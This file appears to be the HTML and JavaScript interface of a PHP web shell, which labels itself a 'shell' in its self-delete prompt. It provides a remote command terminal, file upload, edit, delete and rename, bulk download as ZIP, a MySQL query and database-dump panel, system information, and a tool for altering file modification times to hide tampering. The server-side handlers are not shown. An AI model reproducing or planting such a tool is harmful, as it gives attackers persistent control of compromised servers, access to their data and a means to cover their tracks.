				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
				<label for="filename">Create file:</label>
				<input type="text" id="filename" name="filename" placeholder="File name" required>
				<button type="submit" name="create_file">Create file</button>
			</form>

			<form method="post">
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
				<label for="dirname">Create directory:</label>
				<input type="text" id="dirname" name="dirname" placeholder="Directory name" required>
				<button type="submit" name="create_directory">Create directory</button>
			</form>

			<form method="post" enctype="multipart/form-data">
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
				<label for="upload_file">Upload file:</label>
				<input type="file" id="upload_file" name="upload_file" required>
				<button type="submit">Upload file</button>
			</form>
		</div>
		<div id="result">
			<?php echo $outputTools; ?>
		</div>
    </div>
    <div style="margin-top: 10px; margin-bottom: -20px;">
		<form method="post" id="download-selected-form">
			<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
			<div id="selected-files-input"></div>
			<button type="submit" name="download_selected">Download Selected As ZIP</button>
		</form>
		
		<form action=""  method="post">
			<button id="modifyButton" disabled>Modify File Time</button>
		</form>
		
			
		
    </div>
	
	<div style="display:flex;flex-direction:row; width:100%">
		<div style="width:100%">
			<form method="post" action="">
				<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory, ENT_QUOTES, 'UTF-8'); ?>">
				<table class="table" style="width:80%">
					<thead>
						<tr>
							<th><input type="checkbox" onclick="toggleCheckboxes(this)"></th>
							<th>Name</th>
							<th>Type</th>
							<th>Size</th>
							<th>Owner/Group</th>
							<th>Permissions</th>            
							<th>Date</th>
							<th>Action</th>
						</tr>
					</thead>
					<tbody>
						<?php		
						if ($parentDir !== null): ?>
							<tr>
								<td><input type='checkbox' name='selected_files[]' value='..'></td>
								<td>
									<form method='post' style='display:inline;'>
										<input type='hidden' name='dir' value="<?php echo htmlspecialchars($parentDir, ENT_QUOTES, 'UTF-8'); ?>">
										<button type='submit' name='navigate'>...</button>
									</form>
								</td>
								<td></td>
								<td></td>
								<td></td>
								<td></td>
								<td></td>
								<td></td>
							</tr>
						<?php endif; ?>

						<?php foreach ($items as $item): ?>
							<?php
							$itemPath = "$directory/$item";
							$type = is_dir($itemPath) ? 'Directory' : 'File';
							if ($type === 'File' && !is_readable($itemPath)) {
								$size = '-';
								$modified = '-';
								$perms = '-';
								$ownerGroup = '-';
							} else {
								$size = is_dir($itemPath) ? '-' : formatSizeUnits(filesize($itemPath));
								$modified = date("Y-m-d H:i:s", filemtime($itemPath));
								$perms = getPermissions($itemPath);
								$ownerGroup = getOwnerAndGroup($itemPath);
							}
							?>
							<tr>
								<td><input type='checkbox' class="file-checkbox" name='selected_files[]' data-file="<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>" value="<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>"></td>
								<td>
									<?php if ($type === 'Directory'): ?>
										<form method="post" style="display:inline;">
											<input type="hidden" name="dir" value="<?php echo htmlspecialchars($itemPath, ENT_QUOTES, 'UTF-8'); ?>">
											<button type="submit" name="navigate"><?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?></button>
										</form>
									<?php else: ?>
										<span class="editable" data-name="<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>">
											<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>
										</span>
									<?php endif; ?>
								</td>
								<td><?php echo $type; ?></td>
								<td><?php echo $size; ?></td>
								<td><?php echo $ownerGroup; ?></td>
								<td><?php echo $perms; ?></td>
								<td><?php echo $modified; ?></td>
								<td width="265px">
									<form method="post" style="display:inline;" onsubmit="return confirm('Are you sure?')">
										<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory, ENT_QUOTES, 'UTF-8'); ?>">
										<input type="hidden" name="target" value="<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>">
										<button type="submit" name="delete">Delete</button>
									</form>
									<?php if ($type === 'File'): ?>
										<form method="post" style="display:inline;">
											<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory, ENT_QUOTES, 'UTF-8'); ?>">
											<input type="hidden" name="selected_files[]" value="<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>">
											<button type="submit" name="edit_file">Edit</button>
										</form>
										<form method="post" style="display:inline;">
											<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory, ENT_QUOTES, 'UTF-8'); ?>">
											<input type="hidden" name="download" value="<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>">
											<button type="submit">Download</button>
										</form>
										<!-- NEW: View button -->
										<form method="post" style="display:inline;">
											<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory, ENT_QUOTES, 'UTF-8'); ?>">
											<input type="hidden" name="selected_files[]" value="<?php echo htmlspecialchars($item, ENT_QUOTES, 'UTF-8'); ?>">
											<button type="submit" style="margin-left:2px;" name="view_file">View</button>
										</form>
									<?php endif; ?>
								</td>
							</tr>
						<?php endforeach; ?>
					</tbody>
				</table>
				<script>
					function updateSelectedFiles() {
						const selectedFiles = Array.from(document.querySelectorAll('input[type="checkbox"]:checked'))
							.map(checkbox => checkbox.value);

						const selectedFilesInput = document.getElementById('selected-files-input');
						selectedFilesInput.innerHTML = '';

						selectedFiles.forEach(file => {
							const input = document.createElement('input');
							input.type = 'hidden';
							input.name = 'selected_files[]';
							input.value = file;
							selectedFilesInput.appendChild(input);
						});
					}
					
					document.addEventListener('DOMContentLoaded', function () {
						document.getElementById('download-selected-form').addEventListener('submit', function () {
							updateSelectedFiles();
						});
					});
				</script>
		</div>

		<div>
			<form style="float:right;margin-right:20px;" method="POST">
				<div style="border: 1px solid #eee; box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1); padding: 10px; margin-top: 15px;">
					<input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory); ?>">
					<p><input type="text" name="name" placeholder="DB name" required></p>
					<p><input type="text" name="user" placeholder="DB user" required></p>
					<p><input type="password" name="pass" placeholder="DB pass" autocomplete="off"></p>
					<p><input type="text" name="host" placeholder="MySQL host" required></p>
					<p><textarea name="sql_query" rows="5" cols="40" placeholder="Enter your SQL query here..."></textarea></p>
					<p>
						<button type="submit" name="execute_sql">Execute SQL Query</button>
						<button type="submit" name="save_db">Save DB to dbase.sql</button>
					</p>
				</div>
			</form>
		</div>
	</div>

    <div id="sqlResultModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <div id="sqlResultContent"></div>
        </div>
    </div>
	
	<div id="terminalModal" class="modal">
	  <div class="modal-content" style="color:#fff; max-width:700px;">
		<span class="close" id="closeTerminalModal">&times;</span>
		<div id="terminal-output" style="height:300px;height:400px;overflow-y:auto;font-family:monospace;font-size:14px;white-space:pre;background:#181a1b;padding:10px;border-radius:4px;"></div>
		<form id="terminal-form" autocomplete="off" style="margin-top:8px;display:flex;">
		  <span style="color:#67ef67;">$</span>
		  <input type="text" id="terminal-input" style="flex:1;margin-left:5px;background:#181a1b;color:#fff;border:0;border-radius:2px;padding:4px;font-family:monospace;" autofocus autocomplete="off">
		  <button type="submit" style="display:none"></button>
		</form>
	  </div>
	</div>
	
	<div id="modifyModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:#76899d; padding:20px; border:1px solid #ccc; z-index:1000;">
		<h3>Modify file time</h3>
		<label for="modifyFile">File:</label>
		<input type="text" id="modifyFile" readonly><br><br>
		
		<label for="newTime">New modification time:</label>
		<input type="datetime-local" id="newTime"><br><br>
		
		<button id="saveModify">Save</button>
		<button id="cancelModify">Cancel</button>
	</div>

    <script>
        function openModal(content) {
            const modal = document.getElementById("sqlResultModal");
            const modalContent = document.getElementById("sqlResultContent");
            modalContent.innerHTML = content;
            modal.style.display = "block";
        }

        function closeModal() {
            const modal = document.getElementById("sqlResultModal");
            modal.style.display = "none";
        }

        window.onload = function () {
            const modal = document.getElementById("sqlResultModal");
            const span = document.querySelector(".close");

            span.onclick = closeModal;

            window.onclick = function (event) {
                if (event.target === modal) {
                    closeModal();
                }
            };
        };

        <?php if (isset($output)): ?>
            openModal(`<?php echo addslashes($output); ?>`);
        <?php endif; ?>

        function toggleCheckboxes(source) {
            const checkboxes = document.querySelectorAll('input[type="checkbox"][name^="selected_files"]');
            checkboxes.forEach(checkbox => checkbox.checked = source.checked);
        }
    </script>
	<script>
		function confirmDelete() {
			return confirm("Are you sure?");
		}

		<?php if (isset($output)): ?>
			openModal(`<?php echo addslashes($output); ?>`);
		<?php endif; ?>

		function toggleCheckboxes(source) {
			const checkboxes = document.querySelectorAll('input[type="checkbox"][name^="selected_files"]');
			checkboxes.forEach(checkbox => checkbox.checked = source.checked);
		}
	</script>
	
	<script>
		const editor = document.getElementById('editor');
		const lineNumbers = document.getElementById('line-numbers');

		if (editor) {
			editor.addEventListener('scroll', function () {
				lineNumbers.scrollTop = editor.scrollTop;
			});
		}
	</script>
	
	<script>
		document.getElementById('tblInfBtn').addEventListener('click', function() {
			if (document.querySelector('.phpinfo-container')) {
				document.querySelector('.phpinfo-container').remove();
			}

			var tblInf = document.getElementById('tblInf');
			var toolsArea = document.getElementById('tools-area');
			if (tblInf.classList.contains('hidden-block')) {
				tblInf.classList.remove('hidden-block');
				toolsArea.classList.remove('hidden-block');
				tblInf.classList.add('visible-block');
				toolsArea.classList.add('visible-block');
				document.querySelector('#tblInf').style.display = 'block';
				document.getElementById('tools').style.display = 'none';
				document.getElementById('tblInfBtn').textContent = 'Hide SystemInfo Block';
			} else {
				tblInf.classList.remove('visible-block');
				toolsArea.classList.remove('visible-block');
				tblInf.classList.add('hidden-block');
				toolsArea.classList.add('hidden-block');
				document.querySelector('#tblInf').style.display = 'none';
				document.getElementById('tblInfBtn').textContent = 'Open SystemInfo Block';
			}
		});

		document.getElementById('toolsBtn').addEventListener('click', function() {
			if (document.querySelector('.phpinfo-container')) {
				document.querySelector('.phpinfo-container').remove();				
			}

			var tools = document.getElementById('tools');
			var toolsArea = document.getElementById('tools-area');
			if (tools.classList.contains('hidden-block')) {
				tools.classList.remove('hidden-block');
				toolsArea.classList.remove('hidden-block');
				tools.classList.add('visible-block');
				toolsArea.classList.add('visible-block');
				document.getElementById('tools').style.display = 'block';
				document.querySelector('#tblInf').style.display = 'none';
				document.getElementById('toolsBtn').textContent = 'Hide Tools Block';
			} else {
				tools.classList.remove('visible-block');
				toolsArea.classList.remove('visible-block');
				tools.classList.add('hidden-block');
				toolsArea.classList.add('hidden-block');
				document.getElementById('toolsBtn').textContent = 'Open Tools Block';
			}
		});
	</script>
	<script>
		document.addEventListener('DOMContentLoaded', function () {
			const modifyButton = document.getElementById('modifyButton');
			const modifyFileInput = document.getElementById('modifyFile');
			const checkboxes = document.querySelectorAll('.file-checkbox');

			checkboxes.forEach(checkbox => {
				checkbox.addEventListener('change', function () {
					modifyButton.disabled = !this.checked;

					if (this.checked) {
						modifyFileInput.value = this.getAttribute('data-file');
						modifyFileInput.style.color = '#000';
					} else {
						modifyFileInput.value = '';
					}
				});
			});

			modifyButton.addEventListener('click', function (e) {
				e.preventDefault();

				const fileName = document.getElementById('modifyFile').value;
				console.log('Selected file:', fileName);

				if (!fileName) {
					console.error('No file selected');
					return;
				}

				const modal = document.getElementById('modifyModal');
				modal.style.display = 'block';

				fetch('', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/x-www-form-urlencoded'
					},
					body: 'get_mtime=' + encodeURIComponent(fileName)
				}).then(response => response.text())
					.then(time => {
					console.log('Server response:', time);
					if (time.startsWith('Error')) {
						console.error(time);
					} else {
						document.getElementById('newTime').value = time;
					}
				})
				.catch(error => {
					console.error('Fetch error:', error);
				});
			});
		});
	</script>
	<script>
		document.addEventListener('DOMContentLoaded', function () {
			const modal = document.getElementById('modifyModal');
			const saveModifyButton = document.getElementById('saveModify');
			const cancelModifyButton = document.getElementById('cancelModify');

			saveModifyButton.addEventListener('click', function () {
				const fileName = document.getElementById('modifyFile').value;
				const newTime = document.getElementById('newTime').value;

				if (!fileName || !newTime) {
					console.error('Invalid input: File name or time is missing');
					return;
				}

				fetch('', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/x-www-form-urlencoded'
					},
					body: 'modify=' + encodeURIComponent(fileName) + '&time=' + encodeURIComponent(newTime)
				}).then(response => response.text())
					.then(result => {
					console.log('Server response:', result);
					alert('Modification time updated successfully');
					location.reload();
				})
				.catch(error => {
					console.error('Error updating modification time:', error);
					alert('Error updating modification time');
				});

				modal.style.display = 'none';
			});

			cancelModifyButton.addEventListener('click', function () {
				modal.style.display = 'none';
			});
		});
	</script>
	
	<script>
	document.addEventListener('DOMContentLoaded', function() {
		document.querySelectorAll('.editable').forEach(function(td) {
			td.ondblclick = function() {
				if (td.querySelector('input')) return; // Уже редактируется

				const oldName = td.dataset.name;
				const input = document.createElement('input');
				input.type = 'text';
				input.value = oldName;
				input.className = 'edit-rename';

				input.onkeydown = function(e) {
					if (e.key === 'Enter') {
						e.preventDefault();
						this.blur(); // чтобы onblur сработал и отправил AJAX
					}
					if (e.key === 'Escape') {
						td.textContent = oldName;
						td.dataset.name = oldName;
					}
				};

				input.onblur = function() {
					const newName = input.value.trim();
					if (!newName || newName === oldName) {
						td.textContent = oldName;
						td.dataset.name = oldName;
						return;
					}
					// --- [ AJAX rename ] ---
					const xhr = new XMLHttpRequest();
					const params = new URLSearchParams({
						action: 'rename',
						dir: <?=json_encode($directory)?>,
						old_name: oldName,
						new_name: newName
					});
					xhr.open('POST', '', true);
					xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
					
					xhr.onload = function() {
						if (xhr.responseText.trim() === 'OK') {
							td.textContent = newName;
							td.dataset.name = newName;
						} else {
							//alert(xhr.responseText.trim());
							td.textContent = oldName;
							td.dataset.name = oldName;
							location.reload();
						}
					};
					
					/*
					if (xhr.responseText.indexOf('OK') !== -1) {
						location.reload();
					} else {
						alert(xhr.responseText);
						td.textContent = oldName;
						td.dataset.name = oldName;
					}
					*/
					/*
					xhr.onload = function() {
						if (xhr.responseText.trim() === 'OK') {
							td.textContent = newName;
							td.dataset.name = newName;
							location.reload();
						} else {
							alert(xhr.responseText.trim());
							td.textContent = oldName;
							td.dataset.name = oldName;
							//location.reload();
						}
					};
					*/
					/*
					xhr.onload = function() {
						alert(xhr.responseText); // посмотрите что реально приходит
						if (xhr.responseText.trim() === 'OK') {
							location.reload();
						} else {
							alert(xhr.responseText.trim());
							td.textContent = oldName;
							td.dataset.name = oldName;
						}
					};*/
					xhr.send(params.toString());
					console.log(params.toString());
					//console.log('dir:', <?=json_encode($directory)?>);
				};
				td.textContent = '';
				td.appendChild(input);
				input.focus();
				input.select();
			}
		});
	});
	</script>
	<script>
	document.getElementById('copy-dir-btn').addEventListener('click', function() {
		const dir = document.getElementById('current-dir-path').innerText;
		navigator.clipboard.writeText(dir).then(function() {
			const msg = document.getElementById('copy-success');
			msg.style.display = 'inline';
			setTimeout(() => { msg.style.display = 'none'; }, 1200);
		});
	});
	</script>
	
</div>

<script>
document.addEventListener('DOMContentLoaded', function () {
    // View file button handler
    document.querySelectorAll('.view_file').forEach(function(btn) {
        btn.addEventListener('click', function() {
            const file = this.getAttribute('data-file');
            const dir = this.getAttribute('data-dir');
            // Запрос на сервер для получения содержимого файла
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=view_file&dir=' + encodeURIComponent(dir) + '&file=' + encodeURIComponent(file)
            }).then(r => r.text())
              .then(content => openModal(
                `<h3 style="margin-top:0;">View file: ${file}</h3>
                <pre style="max-height:400px;overflow:auto;background:#222;color:#fff;padding:10px;">` +
                escapeHtml(content) +
                `</pre>`
              ));
        });
    });

    // Escaping for HTML in <pre>
    window.escapeHtml = function(str) {
        return String(str)
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;');
    };
});
</script>
<script>
document.getElementById('selfDeleteBtn').addEventListener('click', function() {
    if (!confirm('You wanna delete the shell?')) return;
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'selfdelete=1'
    })
    .then(r => r.json())
    .then(data => {
        if (data && data.success) {
            alert('Shell has been deleted!');
            window.location.reload();
        } else {
            alert('Deleting error: ' + (data && data.error ? data.error : 'Unknown error'));
        }
    })
    .catch(e => alert('Request error: ' + e));
});
</script>
<script>
	document.getElementById('terminalBtn').addEventListener('click', function() {
	  document.getElementById('terminalModal').style.display = 'block';
	  setTimeout(() => document.getElementById('terminal-input').focus(), 100);
	});

	document.getElementById('closeTerminalModal').addEventListener('click', function() {
	  document.getElementById('terminalModal').style.display = 'none';
	});
	// Закрытие по клику вне окна
	window.addEventListener('click', function(event) {
	  const modal = document.getElementById('terminalModal');
	  if (event.target === modal) {
		modal.style.display = 'none';
	  }
	});
	
	(function() {
	  const form = document.getElementById('terminal-form');
	  const input = document.getElementById('terminal-input');
	  const output = document.getElementById('terminal-output');

	  form.addEventListener('submit', function(e) {
		e.preventDefault();
		const cmd = input.value.trim();
		if (!cmd) return;

		// Добавляем введённую команду в вывод
		output.innerHTML += '<span style="color:#67ef67;">$ ' + escapeHtml(cmd) + '</span>\n';
		output.scrollTop = output.scrollHeight;

		// Отправляем команду на сервер
		fetch('', {
		  method: 'POST',
		  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
		  body: 'terminal_command=' + encodeURIComponent(cmd)
		})
		.then(r => r.text())
		.then(res => {
		  output.innerHTML += escapeHtml(res) + '\n';
		  output.scrollTop = output.scrollHeight;
		})
		.catch(err => {
		  output.innerHTML += '[AJAX error]\n';
		  output.scrollTop = output.scrollHeight;
		});

		input.value = '';
	  });

	  // Вспомогательная функция для экранирования HTML
	  function escapeHtml(str) {
		return String(str)
		  .replace(/&/g, '&amp;')
		  .replace(/</g, '&lt;')
		  .replace(/>/g, '&gt;');
	  }
	})();
</script>

</body>
</html>